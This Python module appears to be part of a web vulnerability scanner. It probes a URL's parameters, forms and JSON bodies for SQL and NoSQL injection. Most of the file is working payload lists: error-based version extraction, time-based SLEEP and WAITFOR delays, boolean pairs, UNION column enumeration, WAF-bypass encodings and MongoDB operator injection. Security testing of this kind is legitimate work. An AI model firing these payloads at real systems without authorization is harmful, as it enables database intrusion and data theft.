"""
SQL Injection Scanner — Industrial-Grade Multi-Signal Detection.

Detection methods:
1. Error-based: Inject SQL syntax errors and detect database error strings
   - MySQL EXTRACTVALUE/UPDATEXML, PostgreSQL CAST, MSSQL CONVERT, Oracle CTXSYS
2. Time-based blind: Inject SLEEP/WAITFOR/pg_sleep/BENCHMARK and measure response delta
3. Boolean-based blind: Compare true-condition vs false-condition responses
   - SUBSTR(), IF(), CASE WHEN variants
4. Union-based: Column enumeration with UNION SELECT NULL,NULL,...
5. NoSQL injection: MongoDB operators ($gt, $ne, $regex, $where)

Anti-false-positive measures:
- Baseline comparison: error strings already in page are ignored
- Time verification: time-based findings verified with 2 additional rounds
- WAF detection: blocked responses are not flagged
- Confidence scoring: multiple signals required for confirmed finding
- Response normalization: dynamic content stripped before comparison
"""

import time
import json
from urllib.parse import urlparse as _urlparse, parse_qs, urlencode, urlunparse
from core.http_client import get, post
from core.config import ScannerConfig
from core.response_analyzer import (
    get_baseline, diff_responses, detect_waf_block,
    calculate_confidence, make_finding,
)
from core.utils import inject_into_params, get_forms, submit_form

# ── Comprehensive SQL error signatures (40+ covering all major DBMS) ──
SQL_ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
    "mysql_num_rows", "mysql_query", "mysqli_", "mysqlnd",
    "com.mysql.jdbc", "org.gjt.mm.mysql",
    "mysql_real_escape_string", "sql syntax.*mysql", "valid mysql result",
    "unknown column", "table.*doesn't exist",
    # PostgreSQL
    "postgresql", "pg_query", "pg_exec", "pg_connect",
    "unterminated quoted string", "syntax error at or near",
    "org.postgresql.util.psqlexception", "current transaction is aborted",
    "invalid input syntax for type",
    # MSSQL
    "microsoft sql", "mssql_query", "unclosed quotation mark",
    "quoted string not properly terminated", "odbc drivers",
    "80040e14", "mssql_", "sql server", "incorrect syntax near",
    "conversion failed when converting",
    # Oracle
    "ora-00933", "ora-06512", "ora-01756", "ora-00921",
    "ora-01476", "ora-00907", "ora-01790", "oracle error",
    "quoted string not properly terminated",
    # SQLite
    "sqlite3", "sqlite_", "sqlite.exception",
    "unrecognized token", "near \":\": syntax error",
    # Generic
    "sql syntax", "syntax error", "invalid query",
    "supplied argument is not a valid",
    "division by zero", "invalid column",
    "sql command not properly ended", "unexpected end of sql",
    "operand should contain 1 column",
]

# ── Error-based payloads (28 — DBMS-specific) ──
ERROR_PAYLOADS = [
    # Generic error triggers
    "'", "\"'", "' OR '1'='1", "' OR '1'='1' --",
    "' OR '1'='1' /*", '" OR "1"="1', "1' ORDER BY 100--",
    "1 UNION SELECT NULL--", "') OR ('1'='1",
    "' AND 1=CONVERT(int, @@version)--",
    "1' AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(1)</script>',table_name FROM information_schema.tables WHERE 2>1--",
    # MySQL EXTRACTVALUE / UPDATEXML
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--",
    "' AND UPDATEXML(1, CONCAT(0x7e, version()), 1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
    "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version())) USING utf8)))--",
    # PostgreSQL CAST errors
    "' AND 1=CAST((SELECT version()) AS int)--",
    "' AND 1::int=CAST((CHR(126)||version()||CHR(126)) AS NUMERIC)--",
    "';SELECT CAST(current_database() AS int)--",
    # MSSQL CONVERT errors
    "' AND 1=CONVERT(int, @@version)--",
    "' AND 1=CONVERT(int, db_name())--",
    "';DECLARE @v VARCHAR(8000);SET @v=@@version;SELECT @v--",
    # Oracle CTXSYS / UTL
    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),5)--",
    # Multi-byte / encoding bypasses
    "%%2727", "%bf%27 OR 1=1--",
    "' /*!50000OR*/ '1'='1",
    "' %26%26 '1'='1",
]

# ── Time-based blind payloads (12) ──
TIME_PAYLOADS = [
    # MSSQL
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("'; IF(1=1) WAITFOR DELAY '0:0:5'--", 5),
    # MySQL SLEEP
    ("1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
    ("1 OR SLEEP(5)=", 5),
    ("1' AND SLEEP(5) AND '1'='1", 5),
    ("' OR (SELECT SLEEP(5))#", 5),
    # MySQL BENCHMARK (alternative to SLEEP)
    ("1' AND BENCHMARK(5000000, SHA1('test'))--", 5),
    ("' AND BENCHMARK(10000000, MD5('a'))#", 5),
    # PostgreSQL pg_sleep
    ("1'; SELECT pg_sleep(5)--", 5),
    ("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", 5),
    # Oracle DBMS_PIPE
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),
    # SQLite randomblob
    ("' AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2))))--", 5),
]

# ── Boolean-based blind pairs (10) ──
BOOLEAN_PAIRS = [
    ("' AND '1'='1' --", "' AND '1'='2' --"),
    ("' AND 1=1 --", "' AND 1=2 --"),
    ('" AND "1"="1" --', '" AND "1"="2" --'),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' AND SUBSTR(version(),1,1)>'0' --", "' AND SUBSTR(version(),1,1)>'9' --"),
    ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --", "' AND (SELECT COUNT(*) FROM information_schema.tables)<0 --"),
    ("' AND IF(1=1,1,0)=1 --", "' AND IF(1=2,1,0)=1 --"),
    ("' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1 --", "' AND CASE WHEN (1=2) THEN 1 ELSE 0 END=1 --"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("' AND ASCII(SUBSTR((SELECT version()),1,1))>0 --", "' AND ASCII(SUBSTR((SELECT version()),1,1))<0 --"),
]

# ── Union-based payloads for column enumeration ──
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
]

# ── NoSQL injection payloads (MongoDB) ──
NOSQL_PAYLOADS = [
    # Operator injection via query params
    ('[$gt]', ''),
    ('[$ne]', ''),
    ('[$regex]', '.*'),
    ('[$exists]', 'true'),
    ('[$nin][]', ''),
]

NOSQL_JSON_PAYLOADS = [
    ('{"$gt": ""}', "nosql_operator"),
    ('{"$ne": ""}', "nosql_operator"),
    ('{"$regex": ".*"}', "nosql_operator"),
    ('{"$where": "return true"}', "nosql_operator"),
    ('{"$or": [{"a": "a"}, {"b": "b"}]}', "nosql_operator"),
]


def test_sqli(url):
    baseline = get_baseline(url, get)

    try:
        r_base = get(url)
        is_blocked, _ = detect_waf_block(r_base)
        if is_blocked:
            return None
    except Exception:
        return None

    # ── 1. Error-based SQLi (params) ──
    for payload in ERROR_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                for sig in SQL_ERROR_SIGNATURES:
                    if sig.lower() in text_lower and sig.lower() not in baseline["text_lower"]:
                        signals["error_string"] = True
                        evidence = sig
                        break

                sim = diff_responses(baseline["text"], r.text)
                signals["response_diff"] = sim < ScannerConfig.DIFF_THRESHOLD
                signals["status_change"] = r.status_code != baseline["status_code"]

                # Require at least error_string for error-based detection
                if not signals.get("error_string"):
                    continue

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "SQL Injection (Error-Based)", confidence, signals,
                        details=f"SQL error '{evidence}' in param '{param}'",
                        severity="Critical", payload=payload,
                        evidence=evidence, parameter=param,
                    )
            except Exception:
                continue

    # ── 2. Error-based SQLi (forms) ──
    forms = get_forms(url)
    for payload in ERROR_PAYLOADS[:8]:
        for form in forms:
            try:
                r = submit_form(form, url, payload)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                for sig in SQL_ERROR_SIGNATURES:
                    if sig.lower() in text_lower and sig.lower() not in baseline["text_lower"]:
                        signals["error_string"] = True
                        evidence = sig
                        break

                signals["response_diff"] = diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD

                if not signals.get("error_string"):
                    continue

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "SQL Injection (Form Error-Based)", confidence, signals,
                        details=f"SQL error '{evidence}' via form submission",
                        severity="Critical", payload=payload, evidence=evidence,
                    )
            except Exception:
                continue

    # ── 3. Time-based blind SQLi ──
    for payload, expected_delay in TIME_PAYLOADS:
        for param, crafted_url in inject_into_params(url, payload):
            try:
                start = time.time()
                r = get(crafted_url, timeout=expected_delay + 5)
                elapsed = time.time() - start

                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                if elapsed >= (expected_delay - 0.5) and elapsed > (baseline["elapsed"] + ScannerConfig.TIME_THRESHOLD):
                    if baseline["elapsed"] >= 2.0:
                        continue

                    verify_ok = True
                    for _ in range(ScannerConfig.TIME_VERIFY_ROUNDS):
                        start_v = time.time()
                        try:
                            get(crafted_url, timeout=expected_delay + 5)
                            v_elapsed = time.time() - start_v
                            if v_elapsed < (expected_delay - 1.0):
                                verify_ok = False
                                break
                        except Exception:
                            verify_ok = False
                            break

                    if verify_ok:
                        signals = {
                            "timing_anomaly": True,
                            "verified": True,
                            "response_diff": diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD,
                        }
                        confidence = calculate_confidence(signals)
                        if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                            return make_finding(
                                url, "SQL Injection (Time-Based Blind)", confidence, signals,
                                details=f"{elapsed:.1f}s delay via param '{param}' (baseline: {baseline['elapsed']:.1f}s)",
                                severity="Critical", payload=payload, parameter=param,
                            )
            except Exception:
                continue

    # ── 4. Boolean-based blind SQLi ──
    for true_payload, false_payload in BOOLEAN_PAIRS:
        for param, true_url in inject_into_params(url, true_payload):
            try:
                parsed = _urlparse(true_url)
                qs = parse_qs(parsed.query, keep_blank_values=True)
                qs[param] = [false_payload]
                false_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

                r_true = get(true_url)
                r_false = get(false_url)

                waf_t, _ = detect_waf_block(r_true)
                waf_f, _ = detect_waf_block(r_false)
                if waf_t or waf_f:
                    continue

                sim_tf = diff_responses(r_true.text, r_false.text)
                sim_tb = diff_responses(baseline["text"], r_true.text)
                sim_fb = diff_responses(baseline["text"], r_false.text)

                # TRUE query must match baseline (sim > 0.85), FALSE query must differ from TRUE (sim < 0.80) and from baseline
                if sim_tb < 0.85 or sim_tf >= 0.80 or sim_fb >= 0.90:
                    continue

                signals = {
                    "boolean_diff": True,
                    "verified": True,
                    "response_diff": sim_tf < 0.75,
                }

                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_CONFIRMED:
                    return make_finding(
                        url, "SQL Injection (Boolean-Based Blind)", confidence, signals,
                        details=f"Confirmed boolean diff in param '{param}' (TRUE vs FALSE sim: {sim_tf:.2f}, TRUE vs Base: {sim_tb:.2f})",
                        severity="Critical", payload=true_payload, parameter=param,
                    )
            except Exception:
                continue

    # ── 5. Union-based SQLi (column enumeration) ──
    prev_status = None
    for i, payload in enumerate(UNION_PAYLOADS):
        for param, crafted_url in inject_into_params(url, payload):
            try:
                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                text_lower = r.text.lower()
                signals = {}
                evidence = ""

                # Detect error disappearing (column count matched)
                has_error = any(sig in text_lower for sig in SQL_ERROR_SIGNATURES)

                if prev_status is True and not has_error:
                    # Previous had error, this one doesn't = column count found
                    col_count = i + 1
                    signals["union_column_match"] = True
                    signals["response_diff"] = diff_responses(baseline["text"], r.text) < ScannerConfig.DIFF_THRESHOLD
                    evidence = f"{col_count} columns matched"

                    confidence = calculate_confidence(signals)
                    if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                        return make_finding(
                            url, "SQL Injection (Union-Based)", confidence, signals,
                            details=f"UNION with {col_count} columns succeeded in param '{param}'",
                            severity="Critical", payload=payload,
                            evidence=evidence, parameter=param,
                        )

                prev_status = has_error
            except Exception:
                continue

    # ── 6. NoSQL injection (MongoDB operators via params) ──
    for suffix, value in NOSQL_PAYLOADS:
        parsed = _urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            continue

        for param in list(params.keys()):
            try:
                modified = {k: v[0] for k, v in params.items()}
                nosql_param = param + suffix
                del modified[param]
                modified[nosql_param] = value
                new_query = urlencode(modified)
                crafted_url = urlunparse(parsed._replace(query=new_query))

                r = get(crafted_url)
                waf_blocked, _ = detect_waf_block(r)
                if waf_blocked:
                    continue

                sim = diff_responses(baseline["text"], r.text)
                signals = {}

                # If the response is significantly different and not an error,
                # the NoSQL operator was accepted
                if sim < 0.60 and r.status_code == 200:
                    signals["nosql_operator"] = True
                    signals["response_diff"] = True
                    signals["content_length"] = abs(len(r.text) - baseline["content_length"]) > 200

                    confidence = calculate_confidence(signals)
                    if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                        return make_finding(
                            url, "NoSQL Injection (MongoDB Operator)", confidence, signals,
                            details=f"NoSQL operator '{suffix}' accepted in param '{param}'",
                            severity="High", payload=f"{param}{suffix}={value}",
                            evidence=f"Response diff: {sim:.2f}", parameter=param,
                        )
            except Exception:
                continue

    # ── 7. NoSQL injection (JSON body) ──
    for payload_json, signal_name in NOSQL_JSON_PAYLOADS:
        try:
            headers = {"Content-Type": "application/json"}
            r = post(url, data=payload_json, headers=headers)
            waf_blocked, _ = detect_waf_block(r)
            if waf_blocked:
                continue

            sim = diff_responses(baseline["text"], r.text)
            if sim < 0.60 and r.status_code == 200:
                signals = {
                    "nosql_operator": True,
                    "response_diff": True,
                }
                confidence = calculate_confidence(signals)
                if confidence >= ScannerConfig.CONFIDENCE_POSSIBLE:
                    return make_finding(
                        url, "NoSQL Injection (MongoDB JSON)", confidence, signals,
                        details=f"NoSQL JSON payload accepted",
                        severity="High", payload=payload_json[:80],
                        evidence=f"Response diff: {sim:.2f}",
                    )
        except Exception:
            continue

    return None